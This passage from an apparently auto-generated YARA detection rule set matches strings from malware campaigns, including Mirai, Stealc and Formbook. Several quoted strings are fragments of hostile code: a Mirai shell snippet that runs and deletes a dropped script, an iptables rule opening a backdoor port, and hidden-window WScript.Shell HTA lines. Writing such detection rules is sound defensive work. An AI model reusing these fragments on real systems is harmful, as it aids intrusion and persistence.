        $s2 = "        if not _advapi32.OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byr" ascii
        $s3 = "_advapi32.OpenProcessToken.argtypes = [wintypes.HANDLE, ctypes.c_ulong, ctypes.POINTER(wintypes.HAND" ascii
        $s4 = "    if not _advapi32.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):" ascii
        $s5 = "        if not _advapi32.OpenProcessToken(process, TOKEN_QUERY, ctypes.byref(token)):" ascii
        $s6 = "            _advapi32.GetTokenInformation(token, TOKEN_LINKED_TOKEN, None, 0, ctypes.byref(size))" ascii
        $s7 = "            if _advapi32.GetTokenInformation(token, TOKEN_LINKED_TOKEN, buf, size, ctypes.byref(size" ascii
        $s8 = "    _fields_ = [(\"LowPart\", ctypes.c_ulong), (\"HighPart\", ctypes.c_long)]" ascii
        $s9 = "_advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL" ascii
        $s10 = "class _TOKEN_PRIVILEGES(ctypes.Structure):" ascii
        $s11 = "        ret = _advapi32.AdjustTokenPrivileges(token, False, ctypes.byref(tp), ctypes.sizeof(tp), Non" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_6aba93d9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6aba93d9"
        date = "2026-10-28"
        campaign = "tlsh-6aba93d9"
        family = ""
        hash = "33b2e61081bd095840ee6c90f902c06b748193fc201acd7b9ae4288acf509b3f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6aba93d9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    all_screened.sort(key=lambda x: x.get(\"network_rate\", 0) or 0, reverse=True)" ascii
        $s1 = "from .tester import Zapret2Tester, CDN_PROVIDERS" ascii
        $s2 = "    payload: dict[str, Any] = field(default_factory=dict)" ascii
        $s3 = "    on_event: Optional[Callable[[AnalyzerEvent], None]] = None," ascii
        $s4 = "    def progress(percent: float, msg: str, current: int = 0, profile: str = \"\") -> None:" ascii
        $s5 = "        emit(AnalyzerEvent(\"intermediate\", {**entry, \"idx\": idx}))" ascii
        $s6 = "in (result.results[0].domain or \"\") else \"\"," ascii
        $s7 = "    def run_one(profile_name: str, idx: int, tier: str, send_intermediate: bool = True," ascii
        $s8 = "    def test_result_cb(profile_name: str):" ascii
        $s9 = "    def emit(ev: AnalyzerEvent) -> None:" ascii
        $s10 = "from typing import Any, Callable, Optional" ascii
        $s11 = "        emit(AnalyzerEvent(\"progress\", {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_ad71d7ab_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-ad71d7ab"
        date = "2026-10-28"
        campaign = "signer_cert_sha1-ad71d7ab"
        family = ""
        hash = "07c318c02be5a3a9f1475f5a2d0cd438f4d4ea3288c28e2e10bc5ebbbec8de86"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-ad71d7ab.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Private Organization1" ascii
        $s1 = "The QT Company Oy0" ascii
        $s2 = "The QT Company Oy1" ascii
        $s3 = "371104235959Z0c1" ascii
        $s4 = "380114235959Z0i1" ascii
        $s5 = "281124235959Z0" ascii
        $s6 = "251125000000Z" ascii
        $s7 = "260805000000Z" ascii
        $s8 = "250507000000Z" ascii
        $s9 = "Uusimaa1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 20945520 and 8 of them
}

rule Sightlines_tlsh_563f36e7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-563f36e7"
        date = "2026-10-27"
        campaign = "tlsh-563f36e7"
        family = "mirai"
        hash = "00d0db4d3dbc46ce64f493b6d0df48a2c8e3b2c4c514a1f5159b8d2c8828cb8f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-563f36e7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s5 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s6 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s7 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s8 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s10 = "ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,rsa-sha2-512,rsa-sha2-256" ascii
        $s11 = "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_dda7b873_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-dda7b873"
        date = "2026-10-26"
        campaign = "host-dda7b873"
        family = "mirai"
        hash = "15c2b1e6708311802cd82e2383a752524ad7687368627a2b381ba652e42998bc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-dda7b873.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" ascii
        $s1 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "203001010000 .mig.sh 2>/dev/null;   if [ -s .mig.sh ]; then sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>" ascii
        $s9 = "/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null; rm -rf .k 2>/dev/null" ascii
        $s10 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s11 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_imphash_67d2dbca_stealc
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-67d2dbca"
        date = "2026-10-27"
        campaign = "imphash-67d2dbca"
        family = "stealc"
        hash = "095aaaa3cd9bb371eb912452ea29d6d12e907fcd4a7cdcefff1e44675c3bb4f6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-67d2dbca.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s1 = "    <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s2 = "$NT Shutdown: OpenProcessToken error.)NT Shutdown: AdjustTokenPrivileges error.!NT Shutdown: ExitWin" wide
        $s3 = "/T:<full path> -- Specifies temporary working folder," wide
        $s4 = "            <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s5 = "    <!-- This Id value indicates the application supports Windows Blue/Server 2012 R2 functionality-" ascii
        $s6 = "            <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s7 = "    <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"> " ascii
        $s8 = "rundll32.exe %sadvpack.dll,DelNodeRunDLL32 \"%s\"" ascii
        $s9 = "/C:<Cmd> -- Override Install Command defined by author." wide
        $s10 = "            <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/> " ascii
        $s11 = "rundll32.exe %s,InstallHinfSection %s 128 %s" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 25165824 and 12 of them
}

rule Sightlines_signer_cert_sha1_c018312d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-c018312d"
        date = "2026-10-27"
        campaign = "signer_cert_sha1-c018312d"
        family = ""
        hash = "019d3ee00b5bdd92618659e6ee0ab8388930be361a5ba30fcb150b1b4f8b0351"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-c018312d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "UTN-USERFirst-Object0" ascii
        $s1 = "Salt Lake City1" ascii
        $s2 = "190709184036Z0" ascii
        $s3 = "151231000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7480048 and 4 of them
}

rule Sightlines_tlsh_cdb4815d_silentnet
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cdb4815d"
        date = "2026-10-27"
        campaign = "tlsh-cdb4815d"
        family = "silentnet"
        hash = "1488081eee0a4dce77a71e615fb0879193168ef4a81e25dab2d1caa674535480"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cdb4815d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "net/anubis/client/gui/HudRenderer$SpotifyGlyph.classPK" ascii
        $s1 = "net/anubis/client/gui/HudRenderer$SpotifyLook.classPK" ascii
        $s2 = "net/anubis/client/module/impl/client/SpotifyHudModule$TrackLyrics.classPK" ascii
        $s3 = "net/anubis/client/module/impl/client/SpotifyHudModule$LyricHighlight.classPK" ascii
        $s4 = "net/anubis/client/module/impl/render/BlockEntityDebugModule$1.classPK" ascii
        $s5 = "net/anubis/client/module/ModuleRegistry$TypeIndex.classPK" ascii
        $s6 = "net/anubis/client/module/impl/combat/CrystalAuraModule$Fight.classPK" ascii
        $s7 = "net/anubis/client/module/impl/combat/CrystalOptimizerModule$AttackProbe.classPK" ascii
        $s8 = "net/anubis/client/gui/HudRenderer$SpotifyColors.classPK" ascii
        $s9 = "net/anubis/client/gui/HudRenderer$SpotifyCard.classPK" ascii
        $s10 = "net/anubis/client/module/impl/combat/CrystalOptimizerModule$Ghost.classPK" ascii
        $s11 = "net/anubis/client/module/impl/misc/AntiVanishModule$ObservationType.classPK" ascii
    condition:
        filesize < 40856028 and 12 of them
}

rule Sightlines_tlsh_05bc8fa3_remusstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-05bc8fa3"
        date = "2026-10-26"
        campaign = "tlsh-05bc8fa3"
        family = "remusstealer"
        hash = "27637ce02ac144ce1e7d29919f722f85cb53ad89a8bf1f634ab7d73cac83a0f7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-05bc8fa3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s2 = "      <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s3 = "random_device::random_device(const std::string&): unsupported token" ascii
        $s4 = "random_device::random_device(const std::string&): device not available" ascii
        $s5 = "cannot create std::vector larger than max_size()" ascii
        $s6 = "basic_string::_M_construct null not valid" ascii
        $s7 = "basic_string::_S_construct null not valid" ascii
        $s8 = "std::basic_string<char, std::char_traits<char>, std::allocator<char> >" ascii
        $s9 = "std::basic_iostream<char, std::char_traits<char> >" ascii
        $s10 = "std::basic_ostream<char, std::char_traits<char> >" ascii
        $s11 = "std::basic_istream<char, std::char_traits<char> >" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0cb74316_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0cb74316"
        date = "2026-10-27"
        campaign = "tlsh-0cb74316"
        family = "mirai"
        hash = "351c9637fe7766c6fd4341e15853b5086631c5cf466f2166681ad867fcd0f49c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0cb74316.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/home/firmware/build/temp-sh4/gcc-core/gcc/config/sh/lib1funcs.asm" ascii
        $s1 = "__linuxthreads_initial_report_events" ascii
        $s2 = "__GI_pthread_attr_getschedpolicy" ascii
        $s3 = "__GI_pthread_attr_setschedpolicy" ascii
        $s4 = "__pthread_wait_for_restart_signal" ascii
        $s5 = "__stdio_mutex_initializer.3812" ascii
        $s6 = "__GI_pthread_attr_getinheritsched" ascii
        $s7 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s8 = "__GI_pthread_attr_setinheritsched" ascii
        $s9 = "__pthread_kill_other_threads_np" ascii
        $s10 = "__GI_pthread_attr_getschedparam" ascii
        $s11 = "__pthread_set_own_extricate_if" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_578f9cdd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-578f9cdd"
        date = "2026-10-27"
        campaign = "tlsh-578f9cdd"
        family = ""
        hash = "0753ccf32a410bfa46fa506d10d079eae4b912189b5256d417916f4dbec5ecc2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-578f9cdd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />" ascii
        $s1 = "    var shAds = new ActiveXObject(\"WScript.Shell\");" ascii
        $s2 = "    var shA = new ActiveXObject(\"WScript.Shell\");" ascii
        $s3 = "  try { window.moveTo(-32000, -32000); } catch (eh2) {}" ascii
        $s4 = "  var u = String(location.pathname || \"\");" ascii
        $s5 = "  try { u = decodeURIComponent(u); } catch (e0) {}" ascii
        $s6 = "<script language=\"JScript\">" ascii
        $s7 = "  WINDOWSTATE=\"minimize\"" ascii
        $s8 = "  BORDERSTYLE=\"normal\"" ascii
        $s9 = "  SHOWINTASKBAR=\"yes\"" ascii
        $s10 = "  SINGLEINSTANCE=\"yes\"" ascii
        $s11 = "  MAXIMIZEBUTTON=\"no\"" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c41ce9ce_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c41ce9ce"
        date = "2026-10-27"
        campaign = "tlsh-c41ce9ce"
        family = ""
        hash = "30d708ca4e2a3dde71855741fd40c581c5a639817798fecffbbd81bb4be3fe39"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c41ce9ce.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "return DateKit.padTwo(when.getHours()) + \":\" + DateKit.padTwo(when.getMinutes());" ascii
        $s1 = "var ImportOverwriteMode = { Stubs: \"Stubs\", All: \"All\" };" ascii
        $s2 = "var b = DateKit.startOfDay(second).getTime();" ascii
        $s3 = "NumKit.buildRange = function (start, stop, step) {" ascii
        $s4 = "MoveNext: function () { i++; return i < self.Inner.length; }," ascii
        $s5 = "NumKit.percentOf = function (part, whole) {" ascii
        $s6 = "var childAttribute = new LxKit.Element();" ascii
        $s7 = "NumKit.clamp = function (value, low, high) {" ascii
        $s8 = "var ImportRecursionMode = { Stubs: \"Stubs\", Recursive: \"Recursive\" };" ascii
        $s9 = "var normalized = text.split(\"\\r\\n\").join(\"\\n\");" ascii
        $s10 = "NumKit.roundTo = function (value, digits) {" ascii
        $s11 = "elem = this.Inner[index] = elem.Owner.OnStubRequest(elem.ID);" ascii
    condition:
        filesize < 3079096 and 12 of them
}

rule Sightlines_tlsh_082ec845_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-082ec845"
        date = "2026-10-27"
        campaign = "tlsh-082ec845"
        family = "mirai"
        hash = "282307391902f2bab55be618ea6acf3d2c15871a45cd83b1b232558e8d31602e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-082ec845.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s1 = "/usr/bin/iptables -A INPUT -p tcp --dport 26721 -j ACCEPT" ascii
        $s2 = "__linuxthreads_pthread_sizeof_descr" ascii
        $s3 = "__linuxthreads_initial_report_events" ascii
        $s4 = "__linuxthreads_pthread_threads_max" ascii
        $s5 = "__GI_pthread_attr_getschedpolicy" ascii
        $s6 = "__GI_pthread_attr_setschedpolicy" ascii
        $s7 = "__pthread_wait_for_restart_signal" ascii
        $s8 = "__stdio_mutex_initializer.3862" ascii
        $s9 = "__GI_pthread_attr_getinheritsched" ascii
        $s10 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s11 = "__GI_pthread_attr_setinheritsched" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_0e99e999_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0e99e999"
        date = "2026-10-27"
        campaign = "tlsh-0e99e999"
        family = ""
        hash = "3bca84d031e1c20d8319bdd9123ce08a844ea507bd3613b80d5f2501d7795869"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0e99e999.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "k6ztI/8FJ0+pFD7fkSIP5QE0Z7U0h6k2JUThmRYlZMEUPt1FgQf/CZkWJUWBNi1FoTQ+v4k0DYRjrA0Ux5EiJXCRgSIlUJDhIiXQ" ascii
        $s1 = "Ii1UIxMKr9sJNAdbEQqP2w00R30mD0ABJD6/USQHHSRHQTYnqTYnzTYn8SYPkA02J/UmD5fxNicZND6zHAknB6AJNAepNEfNJg9Q" ascii
        $s2 = "SdSVIg8cQSDnHcuZIicfzD28IZg90yGYP19EPvNJ1CEnHAP/////DSCn3SAHXSYk4w0iF23TpSI1GEGap8A90GfMPbw5mD3TIZg/" ascii
        $s3 = "v/MTC+/bTSQHGSRHXSItVCMTCq/bCTQHWxEKj9sNNEd9Jg9AASQ+v1EkBx0kR0E2J6k2J802J/EmD5ANNif1Jg+X8TYnGTQ+sxwJ" ascii
        $s4 = "R10iLRQhJicBJ9+JJAcZIg9IASYnSSItFCEn340kBx0iD0gBND6/ETQHXSRHQTYnqTYnzTYn8SYPkA02J/UmD5fxNicZND6zHAkn" ascii
        $s5 = "JidfEQpP28k0Pr/zEwvv200kBxkkR10iLVQjEwqv2wk0B1sRCo/bDTRHfSYPQAEkPr9RJAcdJEdBNiepNifNNifxJg+QDTYn9SYP" ascii
        $s6 = "JjXAQZvfG8A8PhFL9///zQQ9vCEiNdBfxScfBEAAAAEkpwWYPH4QAAAAAAGaQZg86YQ8MTDnJdhhMAc9IOfdy7WYPOmFO/wxMOcl" ascii
        $s7 = "BSItVAEmJ18RCk/byTQ+v/MTC+/bTSQHGSRHXSItVCMTCq/bCTQHWxEKj9sNNEd9Jg9AASQ+v1EkBx0kR0E2J6k2J802J/EmD5AN" ascii
        $s8 = "Ii0UISYnASffiSQHGSIPSAEmJ0kiLRQhJ9+NJAcdIg9IATQ+vxE0B10kR0E2J6k2J802J/EmD5ANNif1Jg+X8TYnGTQ+sxwJJweg" ascii
        $s9 = "Jx0n34kmJxUmJ1kiLRQBJ9+NND6/8SQHGSRHXSItFCEmJwEn34kkBxkiD0gBJidJIi0UISffjSQHHSIPSAE0Pr8RNAddJEdBNiep" ascii
        $s10 = "WSItFAEn3400Pr/xJAcZJEddIi0UISYnASffiSQHGSIPSAEmJ0kiLRQhJ9+NJAcdIg9IATQ+vxE0B10kR0E2J6k2J802J/EmD5AN" ascii
        $s11 = "34kkBxkiD0gBJidJIi0UISffjSQHHSIPSAE0Pr8RNAddJEdBNiepNifNNifxJg+QDTYn9SYPl/E2Jxk0PrMcCScHoAk0B6k0R80m" ascii
    condition:
        filesize < 31707744 and 9 of them
}

rule Sightlines_signer_cert_sha1_ed2969b5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-ed2969b5"
        date = "2026-10-27"
        campaign = "signer_cert_sha1-ed2969b5"
        family = ""
        hash = "29fc393b56fcfa4a242c7bc5177b0861072f35c7c8be2546115e0f34d059e2bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-ed2969b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "310107120000Z0r1" ascii
        $s1 = "310106000000Z0H1" ascii
        $s2 = "160107120000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 27829288 and 3 of them
}

rule Sightlines_tlsh_edadf5f8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-edadf5f8"
        date = "2026-10-27"
        campaign = "tlsh-edadf5f8"
        family = "mirai"
        hash = "567550e05fa911763c1eb0d4ca8147ef1123f54453800597ab9ef887a92fafc2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-edadf5f8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s5 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s6 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s7 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s8 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s10 = "ssh-ed25519,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,rsa-sha2-512,rsa-sha2-256" ascii
        $s11 = "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_973dccff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-973dccff"
        date = "2026-10-26"
        campaign = "tlsh-973dccff"
        family = ""
        hash = "5a9049db6ca9b541735b3bdc1728c7a6b00d0f39cdf088f95a60bae90ed824ce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-973dccff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\",2,15),e.fillStyle=\"rgba(102, 204, 0, 0.7)\",e.font=\"18pt Arial\",e.fillText(\"Cwm fjordbank glyphs ve" ascii
        $s1 = "ull,V=\"function\"==typeof WeakMap?new WeakMap:null,W=[];function J(t){t&&(S=\"number\"==typeof t.timeSt" ascii
        $s2 = "92653589793\"),n=function(n){return eval(t+\" ** -100\")==+(\"1.9275814160560\"+n+\"e-50\")},r=n(204),e=n(1" ascii
        $s3 = "tfagqjufqEvm`dfa\",\"[[saf`vmrav[[glv\",\"rdqlk@}uw`vvljk@wwjw\",\"qgrohC~vtcuuoihTcusjr\",\"tw~iibuXfccnsnh" ascii
        $s4 = "agName?t.tagName.toLowerCase():\"\")||\"input\"===n)}function p(t,n){var r,e,i,a,c=t.length;return c?1==" ascii
        $s5 = ",a=e-n;return Math.sqrt(i*i+a*a)}function _(t){var n;return!(!t||1!==t.nodeType)&&(\"button\"===(n=t.t" ascii
        $s6 = "31),i=r(539),a=window,c=function(t,n){for(var r in n)n.hasOwnProperty(r)&&\"__proto__\"!==r&&(t[r]=n[r" ascii
        $s7 = "en(function(n){if(n&&n.length){for(var e=0;e<n.length;e++){var i=n[e];i&&i.kind&&a.hasOwnProperty(i." ascii
        $s8 = ")});y.observe({entryTypes:[\"resource\"]})}}catch(t){}return 1}}},555:function(t,n,r){var e=r(331),i=e" ascii
        $s9 = "kind)&&a[i.kind]++}r={s:a.audiooutput,m:a.audioinput,w:a.videoinput},t(r)}else t(r={s:0,m:0,w:0})})." ascii
        $s10 = "=r?String.fromCharCode(n>>16&255):64===e?String.fromCharCode(n>>16&255,n>>8&255):String.fromCharCode" ascii
        $s11 = "Root.querySelector('button[data-action-btn=\"true\"]');if(n&&\"Take over\"===n.innerText)return n}catch(" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_b1d88192_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-b1d88192"
        date = "2026-10-27"
        campaign = "dotnet_typelib_guid-b1d88192"
        family = "formbook"
        hash = "34e5887dd33383ebaefa05e6237615463987affd4af6846163fba94221b0b435"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-b1d88192.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Data Source=DESKTOP-BH4JOH6;Initial Catalog=QL_KARAOKE;User ID=sa;Password=123456;Integrated Securit" wide
        $s1 = "Data Source=DESKTOP-BH4JOH6;Initial Catalog=QL_KARAOKE;Integrated Security= True" wide
        $s2 = "StreamingOutput-OBS-VirtualCam,NDI,RTMP,Discord-GoLive,Twitch" ascii
        $s3 = "LatencyEngine3WASAPI-Exclusive,ASIO,DirectSound,Sub-5ms-Roundtrip" ascii
        $s4 = "SongLibrary0CDG,KAR,MIDI,LRC,SRT,MP3+G,MP4,WebM,YouTube-Sync" ascii
        $s5 = "MicrophoneSupport6USB,XLR-Interface,Bluetooth,WirelessUHF,Array,Loopback" ascii
        $s6 = "AudioProcessing8KeyShift-24Semi,TempoStretch,Harmonizer,AutoTune,DeEsser" ascii
        $s7 = "RecordingStudio4MultiTrack,VocalIsolated,MixedMaster,Stems,WAV-24bit" ascii
        $s8 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s9 = "ImportSources6LocalFiles,Spotify-Lyrics,MusicBrainz,CD-Rip,Drag-Drop" ascii
        $s10 = "VideoEngine8Webcam,VirtualBackground,ParticleOverlay,LyricsComposite" ascii
        $s11 = "Localization0EN,JA,KO,ZH,TH,VI,TL,ES,PT,FR,AR,HI,60+Languages" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2783232 and 12 of them
}

rule Sightlines_signer_cert_sha1_5a913d37_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-5a913d37"
        date = "2026-10-27"
        campaign = "signer_cert_sha1-5a913d37"
        family = ""
        hash = "5fd1bf62b065bd9a8bcbf8552d9ffd24f96341c10a4b93c5be0282a2f704fb2e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-5a913d37.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "250911201114Z0t1" ascii
        $s1 = "230012+5029230" ascii
        $s2 = "240912201114Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3244096 and 3 of them
}

rule Sightlines_tlsh_05734660_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-05734660"
        date = "2026-10-27"
        campaign = "tlsh-05734660"
        family = "formbook"
        hash = "13e589b57234b7eb7b0023cae55629f474051f3c3aaaa3df65b083f8156cb860"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-05734660.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Data Source=DESKTOP-BH4JOH6;Initial Catalog=QL_KARAOKE;User ID=sa;Password=123456;Integrated Securit" wide
        $s1 = "Data Source=DESKTOP-BH4JOH6;Initial Catalog=QL_KARAOKE;Integrated Security= True" wide
        $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s3 = "BaoCaoNMCNPM_KARAOKE.frm_khachHang.resources" ascii
        $s4 = "BaoCaoNMCNPM_KARAOKE.frm_quanLy.resources" ascii
